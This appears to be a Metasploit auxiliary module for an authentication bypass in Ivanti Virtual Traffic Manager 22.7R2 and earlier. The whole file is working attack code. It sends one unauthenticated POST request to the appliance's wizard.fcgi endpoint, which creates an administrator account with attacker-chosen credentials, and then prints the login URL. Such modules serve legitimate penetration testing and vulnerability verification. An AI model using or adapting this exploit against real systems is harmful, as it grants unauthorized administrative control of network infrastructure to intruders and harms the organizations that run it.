class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ivanti Virtual Traffic Manager Authentication Bypass',
        'Description' => %q{
          This module exploits an access control issue in Ivanti Virtual Traffic Manager <= 22.7R2, by adding a new
          administrative user to the web interface of the application.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'ohnoisploited' # Discovery and PoC
        ],
        'References' => [
          ['URL', 'https://packetstormsecurity.com/files/179906']
        ],
        'DisclosureDate' => '2024-08-05',
        'DefaultOptions' => {
          'RPORT' => 9090
        },
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('NEW_USERNAME', [true, 'Username to be used when creating a new user with admin privileges', Faker::Internet.username]),
      OptString.new('NEW_PASSWORD', [true, 'Password to be used when creating a new user with admin privileges', Rex::Text.rand_text_alpha(8)]),
    ])
  end

  def run
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'apps/zxtm/wizard.fcgi?error=1&section=Access+Management%3ALocalUsers'),
      'vars_post' => {
        '_form_submitted' => 'form',
        'create_user' => 'Create',
        'group' => 'admin',
        'newusername' => datastore['NEW_USERNAME'],
        'password1' => datastore['NEW_PASSWORD'],
        'password2' => datastore['NEW_PASSWORD']

      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    print_good("New admin user was successfully injected:\n\t#{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
    print_good("Login at: http://#{datastore['RHOSTS']}:#{datastore['RPORT']}#{datastore['TARGETURI']}workflow/jsp/logon.jsp")
  end

end
